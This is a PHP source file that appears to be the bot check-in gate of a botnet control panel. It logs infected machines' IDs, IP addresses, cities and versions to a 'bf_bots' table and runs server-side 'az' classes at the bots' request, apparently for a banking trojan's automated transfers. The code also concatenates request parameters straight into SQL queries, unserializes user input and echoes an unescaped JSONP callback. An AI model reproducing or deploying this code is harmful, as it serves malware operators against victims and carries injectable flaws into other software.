<?php

error_reporting(0);
ini_set('error_reporting', 0);
header("Pragma: no-cache");
header("Expires: 0");

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

include_once($dir . 'includes/functions.php');

get_function('first');
get_function('numformat');
get_function('get_config');
get_function('mb_unserialize');

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();
$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true, false);

get_function('phpservice');

$sys = empty($_GET['sys'])?null:strtolower($_GET['sys']);
$mode = empty($_GET['mode'])?null:$_GET['mode'];
$city = empty($_GET['mode'])?null:$_GET['city'];

if(empty($city)) $city = 'unknow';
//if(!preg_match('~^([a-zA-Z0-9_]+)$~is', $city)) $city = 'unknow';

if(function_exists('mb_strtolower')){
    $city = mb_strtolower($city, 'UTF8');
}else{
    $city = strtolower($city);
}

$system = $mysqli->query('SELECT id, nid, percent FROM bf_systems WHERE (`nid` = \''.$sys.'\') LIMIT 1');
if(empty($system->id) || $system->nid !=  $sys) print_data('SYS_NOTFOUND!', true);

switch($mode){
    case 'info':
	$class_dir = file_exists($dir . 'classes/az/' . $system->nid . '/') ? $system->nid : 'all';
	
	$classes = scandir($dir . 'classes/az/' . $class_dir . '/');
	unset($classes[0], $classes[1]);
	foreach($classes as $class){
		include_once($dir . 'classes/az/' . $class_dir . '/' . $class);
	}
	
        print(GetRegisteredServices());
        //print_rm(json_decode(GetRegisteredServices()));
    break;

    case 'sys':
	$systems = $mysqli->query('SELECT id, nid, name, percent FROM bf_systems');
	foreach($systems as $sys){
	    print_r($sys->nid . "\r\n");
	}
    break;
    
    case 'call':
        $uid = empty($_GET['uid'])?null:$_GET['uid'];
	$userid = empty($_GET['cid'])?null:$_GET['cid'];
	$callback = empty($_GET['callback'])?null:$_GET['callback'];
	$ver = empty($_GET['ver'])?'':$_GET['ver'];
	
	if(empty($uid)){
		print_data('BOT_ERROR!', true);
	}else{
		$matches = explode('0', $uid, 2);
		if(!empty($matches[0]) && !empty($matches[1])){
			$prefix = $matches[0];
			$uid = '0' . $matches[1];
		}else{
			print_data('BOT_ERROR!', true);
		}
	}
	
	$prefix = strtoupper($prefix);
	$uid = strtoupper($uid);
	
	if(!preg_match('~^([a-z]+)$~is', $sys)) print_data('SYS_ERROR!', true);
	
	if(empty($userid)){
	    if(file_exists($dir . 'cache/clients.json')){
		$clients = @json_decode(@file_get_contents($dir . 'cache/clients.json'), true);
		if(is_array($clients) && isset($clients[$prefix])){
		    $userid = $clients[$prefix];
		}
	    }
	}
	
	if(!empty($ver)){
	    $id = $mysqli->query("INSERT INTO bf_bots set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', city='".$city."', version='".$ver."', system='".$system->nid."', last_date = CURRENT_TIMESTAMP() on duplicate key update version = '".$ver."', last_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
	}else{
	    $id = $mysqli->query("INSERT INTO bf_bots set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', city='".$city."', system='".$system->nid."', last_date = CURRENT_TIMESTAMP() on duplicate key update last_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
	}
	
	if(!empty($id)){
		$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`id` = \''.$id.'\') LIMIT 1');
	}else{
		$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`system` = \''.$system->nid.'\') LIMIT 1');
	}
	
	if($city != 'unknow' && $bot->city != $city){
	    $mysqli->query('update bf_bots set city = \''.$city.'\' WHERE (id = \''.$bot->id.'\')');
	    $bot->city = $city;
	}
	
	if($bot->prefix != $prefix && $bot->uid != $uid) print_data('BOT_FERROR!', true);
	
	$bot->ver = $ver;
	
	$call = empty($_GET['call'])?null:mb_unserialize($_GET["call"]);
	//$call = urldecode($call);
	
	if(empty($call)) print_data('CALL_ERROR!', true);
        if(empty($call["class"])) print_data('CLASS_ERROR!', true);
        if(!preg_match('~^([a-zA-Z]+)$~is', $call["class"])) print_data('CLASS_ERROR!', true);
        $class_dir = file_exists($dir . 'classes/az/' . $system->nid . '/') ? $system->nid : 'all';
	if(!file_exists($dir . 'classes/az/' . $class_dir . '/' . $call["class"] . '.php')) print_data('CLASS_NOTFOUND!', true);
        
        include_once($dir . 'classes/az/' . $class_dir . '/' . $call["class"] . '.php');
        $cls = new $call["class"];
        
        if(empty($call["method"])) print_data('METHOD_ERROR!', true);
	if(!preg_match('~^([a-zA-Z_-]+)$~is', $call["method"])) print_data('CLASS_ERROR!', true);
	/*
        $paramRow=array();
        foreach($call["params"] as $prm=>$val){
            $paramRow[]=$val;
        }
	*/
        $res=null;
        
	try{
            //$res = call_user_func_array(array($cls,$call["method"]),$paramRow);
	    //print_rm($call);
	    $res = call_user_func_array(array($cls,$call["method"]),$call["params"]);
            //print($_GET['callback']."(".json_encode(convert("cp1251","utf-8",$res)).");");
	    print($_GET['callback']."(".json_encode($res).");");
        }catch(Exception $e){
            print_data('CLASS_TRY_ERROR!', true);
        }
    break;

    default:
	no_found();
    break;
}

?>